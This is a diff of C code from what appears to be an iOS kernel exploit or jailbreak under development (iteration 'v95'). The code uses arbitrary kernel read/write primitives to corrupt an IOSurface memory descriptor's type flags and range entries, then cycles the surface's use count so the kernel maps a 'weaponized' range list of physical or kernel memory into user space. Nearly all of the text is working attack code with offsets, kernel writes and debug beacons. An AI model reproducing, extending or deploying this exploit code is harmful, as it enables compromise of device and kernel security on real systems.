@@ -269,14 +269,31 @@ int IOSurface_map_withCacheMode(uint64_t pa, uint64_t size, void **uaddr, uint32
 		*uaddr = NULL;
 		return -1;
 	}
+	// v95: candidate selection per window — the re-wire flag ladder.
+	// Even seq = kIOMemoryTypePhysical (0x2): entries are PA (as written).
+	// Odd  seq = kIOMemoryTypeKernelVirtual (0x4): entries = kernel VAs.
+	uint32_t typeCand = (seq & 1) ? 0x4 : 0x2;
 	for (int ei = 0; ei < 4; ei++) {
-		kwrite64(arrAlias + arrOff + 0x10 * ei + 0x0, pa + ei * 0x4000ULL);
+		uint64_t e0 = (typeCand == 0x2)
+		    ? (pa + ei * 0x4000ULL)                                  // physical
+		    : phystokv(kvtophys(pa + ei * 0x4000ULL) & ~0x3FFFULL);  // kernel VA
+		kwrite64(arrAlias + arrOff + 0x10 * ei + 0x0, e0);
 		kwrite64(arrAlias + arrOff + 0x10 * ei + 0x8, 0x4000ULL);
 	}
-	jb_tr_beacon("KMAP ranges4,pa=%llx,e0=%llx,%llx",
-	             (unsigned long long)pa,
+	jb_tr_beacon("KMAP ranges4,pa=%llx,cand=%x,e0=%llx,%llx",
+	             (unsigned long long)pa, typeCand,
 	             (unsigned long long)kread64(arrAlias + arrOff),
 	             (unsigned long long)kread64(arrAlias + arrOff + 8));
+
+	// v95 RE-WIRE part 1: force the next wire to interpret entries per
+	// typeCand. v94 verdict: the wire happened at CREATE from the ORIGINAL
+	// list (C,first=0,0 = the zeroed dummy page) — post-create edits are
+	// invisible while wired. desc+0x20 = memory-type flags (v76-proven
+	// full-32-bit kwrite32 class, large object window).
+	uint32_t f20pre = kread32(desc + 0x20);
+	kwrite32(desc + 0x20, typeCand);
+	jb_tr_beacon("KMAP flags,pre=%x,want=%x,rb=%x",
+	             f20pre, typeCand, kread32(desc + 0x20));
 
 	// desc.size retarget via W[0x48,0x68) (v93-proven window/offsets).
 	uint8_t winA[0x20];
@@ -296,15 +313,37 @@ int IOSurface_map_withCacheMode(uint64_t pa, uint64_t size, void **uaddr, uint32
 	             (unsigned long long)kread64(desc + 0x50),
 	             (unsigned long long)kread64(desc + 0x60));
 
+	// v95 RE-WIRE part 2: the use-count cycle — the only userspace lever
+	// that re-runs the wire. Drain to 0 (unwire) then bump to 1 (re-wire,
+	// reading OUR entries under typeCand). Lease/unlease semantics.
+	IOSurfaceRef refC = IOSurfaceLookupFromMachPort(surfaceMachPort);
+	if (!refC) {
+		jb_tr_beacon("KMAP fail,uclookup");
+		*uaddr = NULL;
+		return -1;
+	}
+	uint32_t uc = IOSurfaceGetUseCount(refC);
+	jb_tr_beacon("KMAP uc,pre=%u", uc);
+	while (uc > 0) {
+		IOSurfaceDecrementUseCount(refC);
+		uc = IOSurfaceGetUseCount(refC);
+	}
+	IOSurfaceIncrementUseCount(refC);
+	jb_tr_beacon("KMAP uc,cycled=%u", IOSurfaceGetUseCount(refC));
+
 	// Send-right kobject field dump (v94b fallback feed, carried over).
 	jb_tr_beacon("KMAP sr0=%llx,sr8=%llx,sr30=%llx",
 	             (unsigned long long)kread64(surfaceSendRight + 0x0),
 	             (unsigned long long)kread64(surfaceSendRight + 0x8),
 	             (unsigned long long)kread64(surfaceSendRight + 0x30));
 
-	// THE KERNEL DOES THE MAPPING: first lookup + GetBaseAddress on the
-	// COLD client — it must build the mapping from our weaponized range
-	// list. No warm cache exists to serve.
+	// THE KERNEL DOES THE MAPPING: post-cycle lookup + GetBaseAddress.
+	// (Fresh ref after the use-count cycle — the create-time ref may be
+	// stale if the unwire invalidated it.) Content discriminator through
+	// the kernel-built mapping: TARGET WINDOW CONTENT ⇒ RE-WIRED AND
+	// MAPPED = THE PROBE WINDOW = CHAIN GATE. 0,0 (or repeated qword) ⇒
+	// the re-wire didn't take (wire is create-once; v96 = pre-weaponized
+	// creation path). 539,0-style own-ID ⇒ wired from original list.
 	IOSurfaceRef refB = IOSurfaceLookupFromMachPort(surfaceMachPort);
 	int lookupB = (refB != NULL);
 	void *base1 = lookupB ? IOSurfaceGetBaseAddress(refB) : NULL;
@@ -316,10 +355,6 @@ int IOSurface_map_withCacheMode(uint64_t pa, uint64_t size, void **uaddr, uint32
 		*uaddr = NULL;
 		return -1;
 	}
-	// Content discriminator through the kernel-built mapping: target
-	// window content ⇒ COLD-MAP CONFIRMED = THE PROBE WINDOW = CHAIN
-	// GATE. 539,0-style own-ID pattern ⇒ client cache pre-populated from
-	// elsewhere (v94b). Repeated qword pattern ⇒ unmapped garbage.
 	jb_tr_beacon("KMAP C,first=%llx,%llx",
 	             (unsigned long long)*(volatile uint64_t *)base1,
 	             (unsigned long long)((volatile uint64_t *)base1)[1]);
